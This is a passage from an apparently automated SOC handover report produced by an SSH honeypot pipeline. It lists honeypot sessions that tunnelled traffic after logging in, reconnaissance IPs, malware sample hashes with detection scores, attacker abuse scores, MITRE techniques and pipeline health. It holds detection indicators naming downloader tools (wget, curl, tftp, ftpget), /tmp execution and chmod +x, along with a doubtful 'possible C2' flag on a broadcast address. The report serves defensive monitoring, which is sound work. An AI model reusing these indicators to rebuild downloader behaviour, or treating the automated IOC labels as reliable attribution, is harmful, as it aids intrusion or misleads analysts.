- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49b28d92c2b2

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-07-27 10:52 |
| **Last Seen** | 2026-07-27 10:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:52:00` | `cowrie.session.connect` |
| `2026-07-27 10:52:00` | `cowrie.client.version` |
| `2026-07-27 10:52:00` | `cowrie.client.kex` |
| `2026-07-27 10:52:04` | `cowrie.login.success` |
| `2026-07-27 10:52:05` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-522badfbb464

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-07-27 10:52 |
| **Last Seen** | 2026-07-27 10:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:52:14` | `cowrie.session.connect` |
| `2026-07-27 10:52:15` | `cowrie.client.version` |
| `2026-07-27 10:52:15` | `cowrie.client.kex` |
| `2026-07-27 10:52:17` | `cowrie.login.success` |
| `2026-07-27 10:52:18` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **19** | 2026-07-27 06:55 | 2026-07-27 10:44 | 19m | 0 | `T1592` | 🟠 MEDIUM |
| `115.190.119[.]177` | **11** | 2026-07-27 09:38 | 2026-07-27 09:51 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-27 07:09 | 2026-07-27 10:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]113` | **7** | 2026-07-27 10:32 | 2026-07-27 10:54 | 12m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-07-27 10:33 | 2026-07-27 10:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `150.95.66[.]172` | **5** | 2026-07-27 07:19 | 2026-07-27 08:44 | 3m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-07-27 09:24 | 2026-07-27 09:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-07-27 10:47 | 2026-07-27 10:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-27 07:42 | 2026-07-27 07:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-07-27 08:10 | 2026-07-27 08:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | **3** | 2026-07-27 07:01 | 2026-07-27 07:35 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-07-27 09:00 | 2026-07-27 09:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-07-27 10:32 | 2026-07-27 10:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `175.6.146[.]164` | **2** | 2026-07-27 08:43 | 2026-07-27 08:45 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-27 09:08 | 2026-07-27 09:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]129` | **2** | 2026-07-27 10:50 | 2026-07-27 10:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.186.232[.]154` | **2** | 2026-07-27 10:34 | 2026-07-27 10:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.222.86[.]210` | **2** | 2026-07-27 07:10 | 2026-07-27 07:12 | 2m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-07-27 09:07 | 2026-07-27 09:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.35[.]9` | 1 | 2026-07-27 08:46 | 2026-07-27 08:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.64[.]76` | 1 | 2026-07-27 10:02 | 2026-07-27 10:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.182.234[.]231` | 1 | 2026-07-27 09:27 | 2026-07-27 09:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.190[.]191` | 1 | 2026-07-27 07:31 | 2026-07-27 07:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.181.16[.]142` | 1 | 2026-07-27 09:45 | 2026-07-27 09:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.84[.]44` | 1 | 2026-07-27 06:56 | 2026-07-27 06:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]189` | 1 | 2026-07-27 10:06 | 2026-07-27 10:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.93.245[.]203` | 1 | 2026-07-27 10:48 | 2026-07-27 10:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.57[.]50` | 1 | 2026-07-27 07:25 | 2026-07-27 07:26 | 19s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-07-27 07:44 | 2026-07-27 07:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.44.27[.]206` | 1 | 2026-07-27 10:11 | 2026-07-27 10:11 | 14s | 0 | `T1592` | 🟢 LOW |
| `195.218.159[.]123` | 1 | 2026-07-27 09:35 | 2026-07-27 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `27.155.103[.]100` | 1 | 2026-07-27 10:00 | 2026-07-27 10:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `31.173.0[.]26` | 1 | 2026-07-27 09:07 | 2026-07-27 09:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-07-27 10:04 | 2026-07-27 10:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-07-27 07:05 | 2026-07-27 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]5` | 1 | 2026-07-27 08:29 | 2026-07-27 08:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-07-27 08:36 | 2026-07-27 08:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-07-27 07:38 | 2026-07-27 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.142[.]131` | 1 | 2026-07-27 09:35 | 2026-07-27 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-27 07:24 | 2026-07-27 07:24 | 24s | 0 | `T1592` | 🟢 LOW |
| `61.145.181[.]7` | 1 | 2026-07-27 07:11 | 2026-07-27 07:11 | 6s | 0 | `T1592` | 🟢 LOW |
| `62.16.103[.]46` | 1 | 2026-07-27 08:39 | 2026-07-27 08:39 | 3s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]108` | 1 | 2026-07-27 10:40 | 2026-07-27 10:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]47` | 1 | 2026-07-27 08:53 | 2026-07-27 08:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]65` | 1 | 2026-07-27 10:20 | 2026-07-27 10:21 | 10s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-27 08:13 | 2026-07-27 08:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-07-27 07:33 | 2026-07-27 07:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]18` | 1 | 2026-07-27 07:35 | 2026-07-27 07:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]29` | 1 | 2026-07-27 07:36 | 2026-07-27 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]60` | 1 | 2026-07-27 07:49 | 2026-07-27 07:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.115[.]5` | 1 | 2026-07-27 09:38 | 2026-07-27 09:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]158` | 1 | 2026-07-27 07:51 | 2026-07-27 07:51 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **30/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `44fcd7a6a61dd418b64fd2fa3e0048d139740bf74a77d261a6900e24609e83f6` | ELF Binary (Linux executable) (x86 32-bit) | `44fcd7a6a61dd418...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.70.23[.]240` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `123.129.245[.]249` | CN | China Unicom Shandong Province Network | **100** ⚠️ | 50 |
| `217.160.194[.]89` | DE | IONOS SE | **100** ⚠️ | 11 |
| `116.48.143[.]166` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `27.223.98[.]117` | CN | China Unicom Shandong province network | **100** ⚠️ | 50 |
| `116.72.9[.]151` | IN | HATHWAY CABLE AND DATACOM LIMITED | **100** ⚠️ | 50 |
| `196.188.187[.]85` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `45.79.207[.]181` | US | Linode | **100** ⚠️ | 50 |
| `93.62.72[.]229` | IT | Fastweb SpA | **100** ⚠️ | 50 |
| `88.214.25[.]121` | DE | VDS&VPN services | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 164 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 127 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 30 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 29 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 29 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 22 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 279 cases |
| Tool 34  | Credential Extractor        | ✅ 202 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 147 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (10.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 100 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 127 priority case(s) shown individually · 52 recon entry/entries in table (19 group(s) consolidating 90 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-27T11:29:32Z_
